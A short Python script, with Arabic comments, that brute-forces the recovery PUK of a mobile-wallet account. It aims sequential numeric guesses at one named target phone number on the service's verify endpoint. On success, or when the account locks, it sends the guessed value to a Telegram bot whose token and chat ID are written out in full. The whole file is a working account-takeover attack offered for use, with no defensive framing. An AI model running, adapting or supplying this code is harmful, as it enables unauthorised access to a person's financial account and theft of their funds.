import requests
import time
url = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/v1/user/verifypuk"
headers = {"Content-Type": "application/json"}
TOKEN = "9252397028:AAE4kzmZYeIKJuWVdeRiy7Ai5KocsT4xWro"
CHAT_ID = 6263683593
url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
target_phone = "772144841"

for i in range(9999999):
    time.sleep(0.2)
    zee = 1000000
    
    data = {
        "username": target_phone,"recoveryPassword": str(zee + i)
        
         }
    response = requests.post(url, json=data,headers=headers, verify=True)
    
    
    #تحول الرد الى نص من الاحرف الصغيره
    text_lower = response.text.lower()
    
    d = {
    "chat_id": CHAT_ID,
    "text": zee +i 
    
}
    if response.status_code == 200:
        r = requests.post(url2, data=d, timeout=10)
        print(response.status_code,data)
        break
     
     #شرط اذا الرقم محظور توقف
    elif "locked" in text_lower:
        r = requests.post(url2, data=d, timeout=10)
        
        print("الرقم محضور")
        break
        
        
         
       
    print(response.status_code,data)
    
    
    
